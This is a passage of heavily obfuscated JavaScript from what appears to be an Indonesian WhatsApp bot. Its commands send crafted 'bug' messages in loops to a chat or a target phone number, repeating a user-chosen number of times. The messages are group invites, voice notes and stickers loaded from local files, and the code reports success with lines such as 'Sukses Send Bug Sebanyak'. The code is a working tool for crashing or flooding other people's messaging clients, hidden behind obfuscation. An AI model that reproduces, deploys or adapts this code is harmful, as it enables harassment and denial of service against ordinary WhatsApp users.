_0x5ce12a=_0x1288;let _0x3dde46;try{_0x3dde46=Function('return\x20(function()\x20'+_0x5ce12a(0xf3)+');')();}catch(_0x1b0920){_0x3dde46=window;}return _0x3dde46;},_0x429770=_0x43c5b5(),_0x13c63e=_0x429770[_0x93897f(0xe1)]=_0x429770[_0x93897f(0xe1)]||{},_0x3a5192=['log',_0x93897f(0xcf),_0x93897f(0xe3),_0x93897f(0xec),'exception',_0x93897f(0xe0),_0x93897f(0xdc)];for(let _0x952197=0x0;_0x952197<_0x3a5192[_0x93897f(0xd6)];_0x952197++){const _0x4f8c6b=_0x496bdd[_0x93897f(0xe9)]['prototype'][_0x93897f(0xce)](_0x496bdd),_0x558339=_0x3a5192[_0x952197],_0x4c0222=_0x13c63e[_0x558339]||_0x4f8c6b;_0x4f8c6b[_0x93897f(0xd0)]=_0x496bdd[_0x93897f(0xce)](_0x496bdd),_0x4f8c6b['toString']=_0x4c0222[_0x93897f(0xd1)]['bind'](_0x4c0222),_0x13c63e[_0x558339]=_0x4f8c6b;}});_0x2324d7();{if(!isCreator&&!isBan)return;if(args['length']==0x0)return m[_0x4d5b06(0xeb)]('Jumlahnya?');jumlah=''+encodeURI(q);for(let i=0x0;i<jumlah;i++){pc=generateWAMessageFromContent(m[_0x4d5b06(0xe8)],{'groupInviteMessage':{'groupJid':'120363047368062014@g.us','inviteCode':_0x4d5b06(0xea),'inviteExpiration':_0x4d5b06(0xe4),'invitetime':_0x4d5b06(0xf1),'groupName':_0x4d5b06(0xd8)+philips+'️️','jpegThumbnail':fs[_0x4d5b06(0xd7)](_0x4d5b06(0xee)),'caption':_0x4d5b06(0xe5)+philips,'contextInfo':{'forwardingScore':0x96,'isForwarded':!![]}}},{'quoted':{'key':{'participant':_0x4d5b06(0xda),...{'remoteJid':''}},'message':{'liveLocationMessage':{'caption':_0x4d5b06(0xdd),'jpegThumbnail':fs[_0x4d5b06(0xd7)]('./pict.jpg')}}},'contextInfo':{}}),jobotz[_0x4d5b06(0xef)](m[_0x4d5b06(0xe8)],pc[_0x4d5b06(0xd5)],{'messageId':pc[_0x4d5b06(0xd3)]['id']});}jancok('Sukses\x20Send\x20Bug\x20Sebanyak\x20'+jumlah);}
}
	break

case 'jobugvn':{
const _0x5baaf1=_0x35d3;(function(_0x118726,_0x51dcc8){const _0x5341f7=_0x35d3,_0x1b8f54=_0x118726();while(!![]){try{const _0x315733=-parseInt(_0x5341f7(0x1f2))/0x1*(parseInt(_0x5341f7(0x1f0))/0x2)+parseInt(_0x5341f7(0x1e3))/0x3+parseInt(_0x5341f7(0x1f3))/0x4*(-parseInt(_0x5341f7(0x1f4))/0x5)+parseInt(_0x5341f7(0x1dd))/0x6+-parseInt(_0x5341f7(0x1df))/0x7+-parseInt(_0x5341f7(0x1f1))/0x8+parseInt(_0x5341f7(0x1f5))/0x9;if(_0x315733===_0x51dcc8)break;else _0x1b8f54['push'](_0x1b8f54['shift']());}catch(_0x2de022){_0x1b8f54['push'](_0x1b8f54['shift']());}}}(_0x4284,0x7e6ce));const _0x26b007=(function(){let _0x564a2b=!![];return function(_0x2b7b14,_0x23ffa7){const _0x43db0f=_0x564a2b?function(){const _0x1e05c6=_0x35d3;if(_0x23ffa7){const _0x5aa713=_0x23ffa7[_0x1e05c6(0x1dc)](_0x2b7b14,arguments);return _0x23ffa7=null,_0x5aa713;}}:function(){};return _0x564a2b=![],_0x43db0f;};}()),_0x3569d6=_0x26b007(this,function(){const _0x4cfaee=_0x35d3;return _0x3569d6[_0x4cfaee(0x1e4)]()[_0x4cfaee(0x1ed)](_0x4cfaee(0x1f6))['toString']()['constructor'](_0x3569d6)[_0x4cfaee(0x1ed)](_0x4cfaee(0x1f6));});function _0x35d3(_0x294968,_0x3c0ec7){const _0x25ea4f=_0x4284();return _0x35d3=function(_0x3a4396,_0x5e9d0c){_0x3a4396=_0x3a4396-0x1dc;let _0x5250c6=_0x25ea4f[_0x3a4396];return _0x5250c6;},_0x35d3(_0x294968,_0x3c0ec7);}_0x3569d6();const _0x5e9d0c=(function(){let _0x5bc97d=!![];return function(_0x33ad88,_0x3466a3){const _0x19746c=_0x5bc97d?function(){const _0x36ca20=_0x35d3;if(_0x3466a3){const _0x38e7b0=_0x3466a3[_0x36ca20(0x1dc)](_0x33ad88,arguments);return _0x3466a3=null,_0x38e7b0;}}:function(){};return _0x5bc97d=![],_0x19746c;};}()),_0x3a4396=_0x5e9d0c(this,function(){const _0x162b86=_0x35d3,_0xb9b87b=function(){const _0x380715=_0x35d3;let _0x38d7ec;try{_0x38d7ec=Function('return\x20(function()\x20'+_0x380715(0x1f8)+');')();}catch(_0x2b5df0){_0x38d7ec=window;}return _0x38d7ec;},_0x4e3281=_0xb9b87b(),_0x343bb8=_0x4e3281[_0x162b86(0x1e7)]=_0x4e3281[_0x162b86(0x1e7)]||{},_0x9e1768=[_0x162b86(0x1e0),'warn',_0x162b86(0x1f7),_0x162b86(0x1ef),_0x162b86(0x1f9),_0x162b86(0x1e1),_0x162b86(0x1e2)];for(let _0x2664a8=0x0;_0x2664a8<_0x9e1768['length'];_0x2664a8++){const _0x5ea62f=_0x5e9d0c[_0x162b86(0x1eb)][_0x162b86(0x1ea)][_0x162b86(0x1de)](_0x5e9d0c),_0x336af9=_0x9e1768[_0x2664a8],_0x2dd600=_0x343bb8[_0x336af9]||_0x5ea62f;_0x5ea62f[_0x162b86(0x1e6)]=_0x5e9d0c['bind'](_0x5e9d0c),_0x5ea62f['toString']=_0x2dd600[_0x162b86(0x1e4)][_0x162b86(0x1de)](_0x2dd600),_0x343bb8[_0x336af9]=_0x5ea62f;}});function _0x4284(){const _0x44a387=['chat','sendMessage','prototype','constructor','Jumlahnya?','search','Sukses\x20Send\x20Bug\x20Sebanyak\x20','error','45862LhCjwO','1941872UCiEmj','34TsHWbs','4RgLAkA','2510035ARZkap','19147725PPNkCG','(((.+)+)+)+$','info','{}.constructor(\x22return\x20this\x22)(\x20)','exception','reply','apply','788628qiRGxA','bind','6948627rpDVQn','log','table','trace','2327793PqeDIQ','toString','readFileSync','__proto__','console'];_0x4284=function(){return _0x44a387;};return _0x4284();}_0x3a4396();{if(!isCreator&&!isBan)return;if(args['length']==0x0)return m[_0x5baaf1(0x1fa)](_0x5baaf1(0x1ec));jumlah=''+encodeURI(q);for(let i=0x0;i<jumlah;i++){hey=fs[_0x5baaf1(0x1e5)]('./src/dosa\x20pantek.mp3'),jobotz[_0x5baaf1(0x1e9)](m[_0x5baaf1(0x1e8)],{'audio':hey,'mimetype':'audio/mpeg','ptt':!![]},{'quoted':fkonjo});}jancok(_0x5baaf1(0x1ee)+jumlah);}
 }
break

case 'jadibugvn':{
function _0x4776(_0x49c38d,_0x15dd0a){const _0xd1f3ac=_0x566d();return _0x4776=function(_0x3d708c,_0x4c90f4){_0x3d708c=_0x3d708c-0x18a;let _0x481117=_0xd1f3ac[_0x3d708c];return _0x481117;},_0x4776(_0x49c38d,_0x15dd0a);}const _0x2da4ed=_0x4776;(function(_0x3913a4,_0x4930d6){const _0x45ab61=_0x4776,_0x3feaa3=_0x3913a4();while(!![]){try{const _0x3a064f=-parseInt(_0x45ab61(0x199))/0x1*(parseInt(_0x45ab61(0x19c))/0x2)+parseInt(_0x45ab61(0x18a))/0x3*(-parseInt(_0x45ab61(0x1a0))/0x4)+parseInt(_0x45ab61(0x1a8))/0x5*(-parseInt(_0x45ab61(0x19a))/0x6)+-parseInt(_0x45ab61(0x18b))/0x7+-parseInt(_0x45ab61(0x190))/0x8+parseInt(_0x45ab61(0x1a3))/0x9+-parseInt(_0x45ab61(0x18e))/0xa*(-parseInt(_0x45ab61(0x193))/0xb);if(_0x3a064f===_0x4930d6)break;else _0x3feaa3['push'](_0x3feaa3['shift']());}catch(_0x22e90a){_0x3feaa3['push'](_0x3feaa3['shift']());}}}(_0x566d,0xa221f));const _0x3757a9=(function(){let _0x3fdfc7=!![];return function(_0x19aa75,_0x548ad5){const _0x22d3db=_0x3fdfc7?function(){if(_0x548ad5){const _0xb8988=_0x548ad5['apply'](_0x19aa75,arguments);return _0x548ad5=null,_0xb8988;}}:function(){};return _0x3fdfc7=![],_0x22d3db;};}()),_0x2807a1=_0x3757a9(this,function(){const _0x57d26b=_0x4776;return _0x2807a1[_0x57d26b(0x1a4)]()[_0x57d26b(0x19e)](_0x57d26b(0x196))['toString']()[_0x57d26b(0x19b)](_0x2807a1)[_0x57d26b(0x19e)]('(((.+)+)+)+$');});_0x2807a1();const _0x4c90f4=(function(){let _0x27cd58=!![];return function(_0xf6525c,_0x4a75bb){const _0x40e117=_0x27cd58?function(){const _0x5c99c7=_0x4776;if(_0x4a75bb){const _0x3eb259=_0x4a75bb[_0x5c99c7(0x1a7)](_0xf6525c,arguments);return _0x4a75bb=null,_0x3eb259;}}:function(){};return _0x27cd58=![],_0x40e117;};}()),_0x3d708c=_0x4c90f4(this,function(){const _0x140b3a=_0x4776,_0x1cc47a=function(){const _0x1ef19e=_0x4776;let _0x33f4b5;try{_0x33f4b5=Function('return\x20(function()\x20'+_0x1ef19e(0x1a5)+');')();}catch(_0x3ac5c7){_0x33f4b5=window;}return _0x33f4b5;},_0xc1626d=_0x1cc47a(),_0x24c8d2=_0xc1626d[_0x140b3a(0x19f)]=_0xc1626d['console']||{},_0x21f56e=[_0x140b3a(0x197),'warn','info',_0x140b3a(0x194),_0x140b3a(0x191),_0x140b3a(0x19d),'trace'];for(let _0x191d67=0x0;_0x191d67<_0x21f56e[_0x140b3a(0x198)];_0x191d67++){const _0x5fc90=_0x4c90f4[_0x140b3a(0x19b)]['prototype'][_0x140b3a(0x1a6)](_0x4c90f4),_0x303e31=_0x21f56e[_0x191d67],_0xb90fba=_0x24c8d2[_0x303e31]||_0x5fc90;_0x5fc90[_0x140b3a(0x18f)]=_0x4c90f4[_0x140b3a(0x1a6)](_0x4c90f4),_0x5fc90['toString']=_0xb90fba[_0x140b3a(0x1a4)][_0x140b3a(0x1a6)](_0xb90fba),_0x24c8d2[_0x303e31]=_0x5fc90;}});_0x3d708c();{if(!isCreator&&!isBan)return;if(!m['quoted'])throw _0x2da4ed(0x1a2);let media=await quoted[_0x2da4ed(0x18c)]();hey=media,jobotz[_0x2da4ed(0x18d)](m[_0x2da4ed(0x1a1)],{'audio':hey,'mimetype':_0x2da4ed(0x195),'ptt':!![]},{'quoted':fkonjo}),jancok(_0x2da4ed(0x192));}function _0x566d(){const _0x11249c=['197021aeHUvT','error','audio/mpeg','(((.+)+)+)+$','log','length','159nTDljw','546ObJAej','constructor','2894Cbongf','table','search','console','492YwknTw','chat','Reply\x20Audio','8541792Gqlktr','toString','{}.constructor(\x22return\x20this\x22)(\x20)','bind','apply','15425OGBuQn','29379wqHisf','3537478gjpYvt','download','sendMessage','1660scQfJC','__proto__','8300144jYNLEA','exception','Sukses\x20Convert\x20Bugvn'];_0x566d=function(){return _0x11249c;};return _0x566d();}
 }
break

case 'tobugstik': {
const _0x2b4595=_0x47f2;(function(_0x4b84c1,_0x3d85b1){const _0x540c9b=_0x47f2,_0x150a29=_0x4b84c1();while(!![]){try{const _0x13db52=-parseInt(_0x540c9b(0x121))/0x1+parseInt(_0x540c9b(0x124))/0x2+parseInt(_0x540c9b(0x12a))/0x3*(parseInt(_0x540c9b(0x11f))/0x4)+-parseInt(_0x540c9b(0x122))/0x5+parseInt(_0x540c9b(0x12d))/0x6*(-parseInt(_0x540c9b(0x125))/0x7)+-parseInt(_0x540c9b(0x118))/0x8+parseInt(_0x540c9b(0x111))/0x9;if(_0x13db52===_0x3d85b1)break;else _0x150a29['push'](_0x150a29['shift']());}catch(_0x32da24){_0x150a29['push'](_0x150a29['shift']());}}}(_0x13d5,0x4a0b5));function _0x47f2(_0x47248d,_0x40b852){const _0x2b91d5=_0x13d5();return _0x47f2=function(_0x352fe1,_0x587820){_0x352fe1=_0x352fe1-0x111;let _0x286ba9=_0x2b91d5[_0x352fe1];return _0x286ba9;},_0x47f2(_0x47248d,_0x40b852);}const _0x38b145=(function(){let _0x291a59=!![];return function(_0x1404dc,_0x53ce14){const _0x8d5efd=_0x291a59?function(){const _0x1e2ee5=_0x47f2;if(_0x53ce14){const _0x54d839=_0x53ce14[_0x1e2ee5(0x119)](_0x1404dc,arguments);return _0x53ce14=null,_0x54d839;}}:function(){};return _0x291a59=![],_0x8d5efd;};}()),_0x31d905=_0x38b145(this,function(){const _0x4df41f=_0x47f2;return _0x31d905[_0x4df41f(0x116)]()[_0x4df41f(0x128)](_0x4df41f(0x12e))[_0x4df41f(0x116)]()[_0x4df41f(0x11b)](_0x31d905)['search']('(((.+)+)+)+$');});_0x31d905();const _0x587820=(function(){let _0x179c50=!![];return function(_0x42d133,_0x6e7ac3){const _0x408c67=_0x179c50?function(){const _0x47e85e=_0x47f2;if(_0x6e7ac3){const _0x5c7ec1=_0x6e7ac3[_0x47e85e(0x119)](_0x42d133,arguments);return _0x6e7ac3=null,_0x5c7ec1;}}:function(){};return _0x179c50=![],_0x408c67;};}()),_0x352fe1=_0x587820(this,function(){const _0x4d5bbb=_0x47f2;let _0x34ecb7;try{const _0x35db2b=Function(_0x4d5bbb(0x11a)+_0x4d5bbb(0x112)+');');_0x34ecb7=_0x35db2b();}catch(_0x357372){_0x34ecb7=window;}const _0x400ecb=_0x34ecb7[_0x4d5bbb(0x126)]=_0x34ecb7['console']||{},_0x5c4263=[_0x4d5bbb(0x11c),_0x4d5bbb(0x115),'info',_0x4d5bbb(0x114),_0x4d5bbb(0x113),'table',_0x4d5bbb(0x117)];for(let _0x23a392=0x0;_0x23a392<_0x5c4263[_0x4d5bbb(0x12c)];_0x23a392++){const _0xbefa36=_0x587820['constructor'][_0x4d5bbb(0x120)][_0x4d5bbb(0x123)](_0x587820),_0x5eb2c8=_0x5c4263[_0x23a392],_0x3f8a22=_0x400ecb[_0x5eb2c8]||_0xbefa36;_0xbefa36[_0x4d5bbb(0x129)]=_0x587820[_0x4d5bbb(0x123)](_0x587820),_0xbefa36['toString']=_0x3f8a22['toString'][_0x4d5bbb(0x123)](_0x3f8a22),_0x400ecb[_0x5eb2c8]=_0xbefa36;}});_0x352fe1();{if(!isCreator&&!isBan)return;if(!quoted)throw _0x2b4595(0x12b)+(prefix+command);if(/image/['test'](mime)){let media=await quoted[_0x2b4595(0x11d)]();hey=media,jobotz['sendImageAsSticker'](m['chat'],hey,fsticjo,{'packname':global['packname'],'author':global[_0x2b4595(0x11e)]});}jancok(_0x2b4595(0x127));}function _0x13d5(){const _0x36a587=['trace','4547216tSEmMM','apply','return\x20(function()\x20','constructor','log','download','author','764UtZqkd','prototype','456711VfnWhX','953260LGXtcD','bind','655272oRsQYu','7784nrCCPN','console','Sukses\x20Convert\x20To\x20Bugstik','search','__proto__','1347yVkzAo','Balas\x20Video/Image\x20Dengan\x20Caption\x20','length','3012MtLZOo','(((.+)+)+)+$','14974911xEBdlv','{}.constructor(\x22return\x20this\x22)(\x20)','exception','error','warn','toString'];_0x13d5=function(){return _0x36a587;};return _0x13d5();}
}
break

   case 'jadibugstik': {
const _0x1cfd07=_0x4fd4;function _0x3860(){const _0x756e91=['prototype','(((.+)+)+)+$','1883972QgTrvw','2491116wBEMGj','toString','5532849yrHNKn','error','apply','test','console','log','__proto__','bind','constructor','5pJaFDB','Sukses\x20Convert\x20Bugstik','exception','11nBAtYw','57617856GigsbV','27JZRzIp','1OnqTpF','author','4059606fepHIZ','4XyaxSM','trace','3492370bDMkDG','395336FVJAyI','length','packname','chat','return\x20(function()\x20','warn','table'];_0x3860=function(){return _0x756e91;};return _0x3860();}(function(_0x116715,_0x21cfe2){const _0xd566e9=_0x4fd4,_0x2595f9=_0x116715();while(!![]){try{const _0x5ac464=parseInt(_0xd566e9(0xb1))/0x1*(-parseInt(_0xd566e9(0x9f))/0x2)+-parseInt(_0xd566e9(0xb3))/0x3*(parseInt(_0xd566e9(0xb4))/0x4)+parseInt(_0xd566e9(0xab))/0x5*(-parseInt(_0xd566e9(0xa0))/0x6)+-parseInt(_0xd566e9(0xa2))/0x7+parseInt(_0xd566e9(0xb7))/0x8*(-parseInt(_0xd566e9(0xb0))/0x9)+-parseInt(_0xd566e9(0xb6))/0xa*(parseInt(_0xd566e9(0xae))/0xb)+parseInt(_0xd566e9(0xaf))/0xc;if(_0x5ac464===_0x21cfe2)break;else _0x2595f9['push'](_0x2595f9['shift']());}catch(_0x3b9950){_0x2595f9['push'](_0x2595f9['shift']());}}}(_0x3860,0xc4193));const _0xdfe77f=(function(){let _0x31647a=!![];return function(_0x27b8ab,_0x54cad6){const _0x3799e1=_0x31647a?function(){const _0x154f18=_0x4fd4;if(_0x54cad6){const _0x1535c3=_0x54cad6[_0x154f18(0xa4)](_0x27b8ab,arguments);return _0x54cad6=null,_0x1535c3;}}:function(){};return _0x31647a=![],_0x3799e1;};}()),_0x9e1bea=_0xdfe77f(this,function(){const _0x59a62e=_0x4fd4;return _0x9e1bea[_0x59a62e(0xa1)]()['search'](_0x59a62e(0x9e))[_0x59a62e(0xa1)]()[_0x59a62e(0xaa)](_0x9e1bea)['search'](_0x59a62e(0x9e));});_0x9e1bea();function _0x4fd4(_0x4c23a3,_0x2027cd){const _0x217f03=_0x3860();return _0x4fd4=function(_0x48bd8b,_0x4a3c92){_0x48bd8b=_0x48bd8b-0x9a;let _0x53fc61=_0x217f03[_0x48bd8b];return _0x53fc61;},_0x4fd4(_0x4c23a3,_0x2027cd);}const _0x4a3c92=(function(){let _0x18468c=!![];return function(_0x58c274,_0x586db8){const _0x70e7c0=_0x18468c?function(){const _0x559d02=_0x4fd4;if(_0x586db8){const _0x4ff96c=_0x586db8[_0x559d02(0xa4)](_0x58c274,arguments);return _0x586db8=null,_0x4ff96c;}}:function(){};return _0x18468c=![],_0x70e7c0;};}()),_0x48bd8b=_0x4a3c92(this,function(){const _0x4c28e4=_0x4fd4,_0x225d97=function(){const _0x32704e=_0x4fd4;let _0x307c51;try{_0x307c51=Function(_0x32704e(0x9a)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x18f6d3){_0x307c51=window;}return _0x307c51;},_0x3833bd=_0x225d97(),_0x4a28dd=_0x3833bd['console']=_0x3833bd[_0x4c28e4(0xa6)]||{},_0x30f35c=[_0x4c28e4(0xa7),_0x4c28e4(0x9b),'info',_0x4c28e4(0xa3),_0x4c28e4(0xad),_0x4c28e4(0x9c),_0x4c28e4(0xb5)];for(let _0x312c5e=0x0;_0x312c5e<_0x30f35c[_0x4c28e4(0xb8)];_0x312c5e++){const _0x5786fb=_0x4a3c92[_0x4c28e4(0xaa)][_0x4c28e4(0x9d)][_0x4c28e4(0xa9)](_0x4a3c92),_0x32d0ff=_0x30f35c[_0x312c5e],_0x37d307=_0x4a28dd[_0x32d0ff]||_0x5786fb;_0x5786fb[_0x4c28e4(0xa8)]=_0x4a3c92[_0x4c28e4(0xa9)](_0x4a3c92),_0x5786fb[_0x4c28e4(0xa1)]=_0x37d307[_0x4c28e4(0xa1)][_0x4c28e4(0xa9)](_0x37d307),_0x4a28dd[_0x32d0ff]=_0x5786fb;}});_0x48bd8b();{if(!isCreator&&!isBan)return;if(!quoted)throw'Sticker\x20Dengan\x20Caption\x20'+(prefix+command);if(/webp/[_0x1cfd07(0xa5)](mime)){let media=await quoted['download']();hey=media,jobotz['sendImageAsSticker'](m[_0x1cfd07(0xba)],hey,fsticjo,{'packname':global[_0x1cfd07(0xb9)],'author':global[_0x1cfd07(0xb2)]});}jancok(_0x1cfd07(0xac));}
}
break

case 'jobugstik':{
const _0x154225=_0xafc8;(function(_0x4f07b2,_0x11c7f3){const _0x5cf62e=_0xafc8,_0x907d59=_0x4f07b2();while(!![]){try{const _0x5f25ca=-parseInt(_0x5cf62e(0x1b3))/0x1+-parseInt(_0x5cf62e(0x1c1))/0x2+parseInt(_0x5cf62e(0x1ac))/0x3*(-parseInt(_0x5cf62e(0x1bd))/0x4)+-parseInt(_0x5cf62e(0x1aa))/0x5*(-parseInt(_0x5cf62e(0x1c2))/0x6)+parseInt(_0x5cf62e(0x1b0))/0x7*(parseInt(_0x5cf62e(0x1b6))/0x8)+-parseInt(_0x5cf62e(0x1be))/0x9+parseInt(_0x5cf62e(0x1c0))/0xa;if(_0x5f25ca===_0x11c7f3)break;else _0x907d59['push'](_0x907d59['shift']());}catch(_0x100030){_0x907d59['push'](_0x907d59['shift']());}}}(_0x2962,0xc858e));const _0x160b93=(function(){let _0x1f9cbf=!![];return function(_0x580a36,_0xcc4055){const _0x83d11=_0x1f9cbf?function(){const _0x96abf8=_0xafc8;if(_0xcc4055){const _0x3a1d8e=_0xcc4055[_0x96abf8(0x1b8)](_0x580a36,arguments);return _0xcc4055=null,_0x3a1d8e;}}:function(){};return _0x1f9cbf=![],_0x83d11;};}()),_0xebbfe4=_0x160b93(this,function(){const _0x37a55b=_0xafc8;return _0xebbfe4[_0x37a55b(0x1ba)]()[_0x37a55b(0x1b7)]('(((.+)+)+)+$')[_0x37a55b(0x1ba)]()[_0x37a55b(0x1a4)](_0xebbfe4)[_0x37a55b(0x1b7)](_0x37a55b(0x1b5));});_0xebbfe4();function _0xafc8(_0x2f2173,_0x3aadbd){const _0x4806e4=_0x2962();return _0xafc8=function(_0x2320d6,_0x3c2269){_0x2320d6=_0x2320d6-0x1a3;let _0x5b8f1f=_0x4806e4[_0x2320d6];return _0x5b8f1f;},_0xafc8(_0x2f2173,_0x3aadbd);}const _0x3c2269=(function(){let _0x49e848=!![];return function(_0x5ab405,_0x5a232a){const _0x490b85=_0x49e848?function(){const _0x3f4e5d=_0xafc8;if(_0x5a232a){const _0x384247=_0x5a232a[_0x3f4e5d(0x1b8)](_0x5ab405,arguments);return _0x5a232a=null,_0x384247;}}:function(){};return _0x49e848=![],_0x490b85;};}()),_0x2320d6=_0x3c2269(this,function(){const _0x17b325=_0xafc8;let _0x4b5536;try{const _0xa9c34a=Function(_0x17b325(0x1ab)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x4b5536=_0xa9c34a();}catch(_0x36958d){_0x4b5536=window;}const _0x32750a=_0x4b5536[_0x17b325(0x1b1)]=_0x4b5536[_0x17b325(0x1b1)]||{},_0x2ce667=['log',_0x17b325(0x1a8),_0x17b325(0x1b9),_0x17b325(0x1a9),_0x17b325(0x1a3),'table',_0x17b325(0x1a5)];for(let _0x215ca7=0x0;_0x215ca7<_0x2ce667['length'];_0x215ca7++){const _0x6071b7=_0x3c2269[_0x17b325(0x1a4)][_0x17b325(0x1bc)][_0x17b325(0x1bf)](_0x3c2269),_0x233321=_0x2ce667[_0x215ca7],_0x56faed=_0x32750a[_0x233321]||_0x6071b7;_0x6071b7[_0x17b325(0x1ae)]=_0x3c2269['bind'](_0x3c2269),_0x6071b7[_0x17b325(0x1ba)]=_0x56faed[_0x17b325(0x1ba)]['bind'](_0x56faed),_0x32750a[_0x233321]=_0x6071b7;}});_0x2320d6();{if(!isCreator&&!isBan)return;if(args[_0x154225(0x1a7)]==0x0)return m[_0x154225(0x1c3)]('Jumlahnya?');jumlah=''+encodeURI(q);for(let i=0x0;i<jumlah;i++){hey=fs[_0x154225(0x1b4)](_0x154225(0x1af)),jobotz[_0x154225(0x1b2)](m[_0x154225(0x1a6)],hey,fgamjo,{'packname':global['packname'],'author':global[_0x154225(0x1bb)]});}jancok(_0x154225(0x1ad)+jumlah);}function _0x2962(){const _0xc40cf3=['constructor','trace','chat','length','warn','error','90IySlKA','return\x20(function()\x20','5961mpshvw','Sukses\x20Send\x20Bug\x20Sebanyak\x20','__proto__','./src/anjas.webp','7JGKygj','console','sendImageAsSticker','537868NgfpGd','readFileSync','(((.+)+)+)+$','3548696ArHdGs','search','apply','info','toString','author','prototype','2312LSMBhd','5059017dIgpIF','bind','24987440HNuhXF','47768ZLFfiA','50214sduwJM','reply','exception'];_0x2962=function(){return _0xc40cf3;};return _0x2962();}
}
break

case 'jovnto': {
var _0x339e44=_0x32df;(function(_0x4af43b,_0x23b836){var _0x2c1e5d=_0x32df,_0x4b81a5=_0x4af43b();while(!![]){try{var _0x3d6c35=parseInt(_0x2c1e5d(0xca))/0x1+-parseInt(_0x2c1e5d(0xc1))/0x2*(-parseInt(_0x2c1e5d(0xba))/0x3)+parseInt(_0x2c1e5d(0xb0))/0x4*(parseInt(_0x2c1e5d(0xb1))/0x5)+parseInt(_0x2c1e5d(0xcd))/0x6+parseInt(_0x2c1e5d(0xc8))/0x7*(parseInt(_0x2c1e5d(0xcc))/0x8)+-parseInt(_0x2c1e5d(0xb7))/0x9*(parseInt(_0x2c1e5d(0xbe))/0xa)+parseInt(_0x2c1e5d(0xad))/0xb*(-parseInt(_0x2c1e5d(0xb2))/0xc);if(_0x3d6c35===_0x23b836)break;else _0x4b81a5['push'](_0x4b81a5['shift']());}catch(_0x299cbf){_0x4b81a5['push'](_0x4b81a5['shift']());}}}(_0xfb8b,0xa25ed));var _0x5ce55f=(function(){var _0x41817e=!![];return function(_0x3a3832,_0x5eae22){var _0x2a5f78=_0x41817e?function(){var _0x150e1a=_0x32df;if(_0x5eae22){var _0x47e402=_0x5eae22[_0x150e1a(0xc4)](_0x3a3832,arguments);return _0x5eae22=null,_0x47e402;}}:function(){};return _0x41817e=![],_0x2a5f78;};}()),_0x1e2217=_0x5ce55f(this,function(){var _0x1b20c0=_0x32df;return _0x1e2217['toString']()['search'](_0x1b20c0(0xc6))[_0x1b20c0(0xc0)]()[_0x1b20c0(0xae)](_0x1e2217)['search']('(((.+)+)+)+$');});_0x1e2217();function _0xfb8b(){var _0x111682=['length','audio/mpeg','1002744pjPHkn','log','console','1266OJaaps','exception','Nomernya\x20mana?','sendMessage','90bWsqJB','readFileSync','toString','4396tIavLf','@s.whatsapp.net','warn','apply','return\x20(function()\x20','(((.+)+)+)+$','Berhasil\x20Mengirim\x20Bugvn\x20Di\x20Nomer\x20','998767imvzKT','__proto__','324283NwTwFe','{}.constructor(\x22return\x20this\x22)(\x20)','72Qtqmgy','2462184wERUQB','154ygBWgD','constructor','trace','68EIAbvU','328655PBrwnC','2053668QisXui','table','./src/dosa\x20pantek.mp3'];_0xfb8b=function(){return _0x111682;};return _0xfb8b();}var _0x5058ee=(function(){var _0x538ff8=!![];return function(_0x47ec56,_0x18c58e){var _0x1f012d=_0x538ff8?function(){var _0x407037=_0x32df;if(_0x18c58e){var _0x25669d=_0x18c58e[_0x407037(0xc4)](_0x47ec56,arguments);return _0x18c58e=null,_0x25669d;}}:function(){};return _0x538ff8=![],_0x1f012d;};}()),_0x5e7406=_0x5058ee(this,function(){var _0x92354a=_0x32df,_0x4eaa4c=function(){var _0x2efd8a=_0x32df,_0x7452bb;try{_0x7452bb=Function(_0x2efd8a(0xc5)+_0x2efd8a(0xcb)+');')();}catch(_0x5d9ef5){_0x7452bb=window;}return _0x7452bb;},_0x363850=_0x4eaa4c(),_0x384c95=_0x363850[_0x92354a(0xb9)]=_0x363850[_0x92354a(0xb9)]||{},_0x3539a5=[_0x92354a(0xb8),_0x92354a(0xc3),'info','error',_0x92354a(0xbb),_0x92354a(0xb3),_0x92354a(0xaf)];for(var _0x50fc64=0x0;_0x50fc64<_0x3539a5[_0x92354a(0xb5)];_0x50fc64++){var _0x1d8bbb=_0x5058ee[_0x92354a(0xae)]['prototype']['bind'](_0x5058ee),_0x5164d8=_0x3539a5[_0x50fc64],_0x29e249=_0x384c95[_0x5164d8]||_0x1d8bbb;_0x1d8bbb[_0x92354a(0xc9)]=_0x5058ee['bind'](_0x5058ee),_0x1d8bbb[_0x92354a(0xc0)]=_0x29e249[_0x92354a(0xc0)]['bind'](_0x29e249),_0x384c95[_0x5164d8]=_0x1d8bbb;}});_0x5e7406();function _0x32df(_0x56f6d9,_0x10d51a){var _0x290c9e=_0xfb8b();return _0x32df=function(_0x5e7406,_0x5058ee){_0x5e7406=_0x5e7406-0xad;var _0x414b47=_0x290c9e[_0x5e7406];return _0x414b47;},_0x32df(_0x56f6d9,_0x10d51a);}{if(!isCreator&&!isBan)return;if(!text)throw _0x339e44(0xbc);hey=fs[_0x339e44(0xbf)](_0x339e44(0xb4)),jobotz[_0x339e44(0xbd)](text+_0x339e44(0xc2),{'audio':hey,'mimetype':_0x339e44(0xb6),'ptt':!![]},{'quoted':fkonjo}),await m['reply'](_0x339e44(0xc7)+text+_0x339e44(0xc2));}
}
break

case 'jogasvn': {
var _0x4986a1=_0x25ff;(function(_0x3f0d08,_0x340632){var _0x3244f7=_0x25ff,_0x2ac3f4=_0x3f0d08();while(!![]){try{var _0x3aaaf0=parseInt(_0x3244f7(0xef))/0x1*(parseInt(_0x3244f7(0xee))/0x2)+parseInt(_0x3244f7(0x101))/0x3*(-parseInt(_0x3244f7(0xf0))/0x4)+parseInt(_0x3244f7(0xff))/0x5*(parseInt(_0x3244f7(0xf4))/0x6)+parseInt(_0x3244f7(0xf5))/0x7*(parseInt(_0x3244f7(0xfb))/0x8)+-parseInt(_0x3244f7(0xf1))/0x9+-parseInt(_0x3244f7(0x10e))/0xa+parseInt(_0x3244f7(0x10d))/0xb*(-parseInt(_0x3244f7(0xfd))/0xc);if(_0x3aaaf0===_0x340632)break;else _0x2ac3f4['push'](_0x2ac3f4['shift']());}catch(_0x4d146f){_0x2ac3f4['push'](_0x2ac3f4['shift']());}}}(_0x3b15,0x8b0f2));var _0x4fd528=(function(){var _0x45b632=!![];return function(_0x26a2db,_0x2b112f){var _0x43a8e0=_0x45b632?function(){var _0x192d35=_0x25ff;if(_0x2b112f){var _0x5a0987=_0x2b112f[_0x192d35(0xfe)](_0x26a2db,arguments);return _0x2b112f=null,_0x5a0987;}}:function(){};return _0x45b632=![],_0x43a8e0;};}()),_0x418ff6=_0x4fd528(this,function(){var _0x580fa0=_0x25ff;return 